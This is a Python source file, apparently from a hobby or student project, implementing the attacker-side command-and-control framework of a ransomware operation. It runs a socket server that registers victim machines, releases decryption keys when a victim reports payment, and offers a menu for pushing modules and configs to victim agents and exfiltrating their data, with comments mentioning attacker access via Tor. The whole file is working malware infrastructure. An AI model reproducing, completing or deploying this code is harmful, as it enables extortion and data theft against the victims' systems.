from Encryption import *
from AgentHandler import *
import socket
import json
import threading
import pickle

# controls the agent handlers individually
# this is the framework the attacker connects to via tor 


class Attacker_framework:
    """
    the main attacker framework, the framework consists of agent handler objects which are used to individualy handel a diffrent victim agent
    """

    def __init__(self):
        self.agent_handlers = [] #list of agent handler objects
        self.server = True
        self.init_server()

    def load_agent_handlers(self):
        with open("people.pkl", "rb") as file:
            self.agent_handlers = pickle.load(file)

    def create_agent_handler(self, victim_config):
        """
        a method which creates an agent handler and adds it to a list

        victim_config dict: a dictionary containing the victim config
        """
        victim_id = victim_config["id"]
        agent_handler = AgentHandler(victim_id, victim_config)
        self.agent_handlers.append(agent_handler)

    def save_handler(self):
        with open("person.pkl", "wb") as db_file:
            pickle.dump(self.agent_handlers, db_file)

    def init_server(self):
        """
        a method which starts a thread n the background, and rund a socket server serving on port 5000, by calling the start server function
        """
        background_thread = threading.Thread(target=self.start_server, daemon=True)
        background_thread.start()

    def start_server(self, host='0.0.0.0', port=5000):
        """
        a method which starts a socket server to handle client connections.
        Handles 'payment_success' messages and registers new victims.
    
        host str: The host address to bind the server to.
        port int: The port number to listen for incoming connections.
        """
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((host, port))
        server_socket.listen(5) 
        print(f"Server is listening on {host}:{port}")

        while self.server:
            client_socket, client_address = server_socket.accept()
            data = client_socket.recv(1024)
            
            decoded_data = data.decode('utf-8')
            
            #in reality a cryptowallet would be checked to see if a payment was recieved when the agent responds with a payment success
            #however for this project i have not implemented a cryptowallet
            if "paymentsuccess*" in decoded_data:
                #the ransomware payment success comes with the ID of the victim that payed eg. payment_success_LAPTOP1
                payment_info = decoded_data.split("*")
                id = payment_info[-1]
                print(f"\n[+] payment recieved from {id}")
                
                for handler in self.agent_handlers:
                    if handler.id == id:
                        print(f"[+] sending decryption key to victim {id}...")
                        decryption_key = handler.ransomware_priv_key
                        
                        with open(decryption_key, "r") as file:
                            decryption_key_string = file.read()

                        print(decryption_key_string)
                        client_socket.sendall(decryption_key_string.encode("utf-8"))


            #if a connection is recieved on port 5000 a new victim is being registerd and the agent handler will be created 
            elif data:
                #check if the victim allready exists
                registerd = False
                victim_config = json.loads(decoded_data)
                for handler in self.agent_handlers:
                    if handler.id == victim_config["id"]:
                        registerd = True #set the registerd flag to true
                        print("victim is allready registered...")

                        #if the victim is allready registered but the ip address or port has changed it has to be updated in the local config
                        with open(handler.config, "r") as current_config:
                            current_local_config = json.load(current_config)

                        # if the port and ip still match nothing happens
                        if current_local_config["ip"] == victim_config["ip"] and current_local_config["port"] == victim_config["port"]:
                            print("[+] victim server not changed...")

                        else:
                            print("[o] victim config has changed...")
                            print("[+] Updating local config and settings...")

                            self.update_victim(handler, victim_config)
                       
                if not registerd:
                    self.create_agent_handler(victim_config)
                    print(f"\n[LOG] Registered new victim: {victim_config}")
                    print("choose an option: ")

    def update_victim(self, agent_handler, new_victim_config):
        with open(agent_handler.config, "w") as victim_config:
            json.dump(new_victim_config, victim_config, indent=4)

    def select_handler(self):
        """
        a method which allows the attacker to select a victim to update its config
        """
        
        for index, handler in enumerate(self.agent_handlers):
            print(f"{index}: {handler.id}")

        victim_choice = int(input("Victim Agent choice: "))

        victim_handler = self.agent_handlers[victim_choice]

        return victim_handler

    def exfil_data(self):
        """
        a method which allows the attacker to select a victim to exfiltrate data from
        """
        for index, handler in enumerate(self.agent_handlers):
            print(f"{index}: {handler.id}")

        victim_choice = int(input("Victim Agent choice: "))

        victim_handler = self.agent_handlers[victim_choice]

        victim_handler.exfiltrate_data()


    def cli(self):
        """
        a command line interface for the attacker 
        """
        while True:
            print("""
[1] Add Modules         [6] Show config   
[2] Remove Modules      [7] show victims  
[3] Send Config
[4] Exfil data   
[5] Show Exfil Data
       
                  """)
            
            choice = int(input("choose an option: "))
            
            if choice == 1:
                if self.agent_handlers: 
                    victim_handler = self.select_handler()
                    victim_handler.add_modules() #call the update config method from the victim handler class
                else:
                    print("[!] No handlers found...")

            if choice == 2:
                victim_handler = self.select_handler()
                victim_handler.remove_modules() #call remove module function

            if choice == 3:
                victim_handler = self.select_handler()
                victim_handler.send_config_framework()

            if choice == 4:
                if self.agent_handlers:
                    self.exfil_data()
                else:
                    print("[!] No handlers found...")

            if choice == 5:
                victim_handler = self.select_handler()
                victim_handler.show_exfil_data() #call show exfil data method

            if choice == 6:
                victim_handler = self.select_handler()
                victim_handler.show_config() #call show config method

            if choice == 7:
                for index, handler in enumerate(self.agent_handlers):
                    print(f"{index}: {handler.id}")


    





if __name__=="__main__":
    attacker_framework = Attacker_framework()
    attacker_framework.cli()






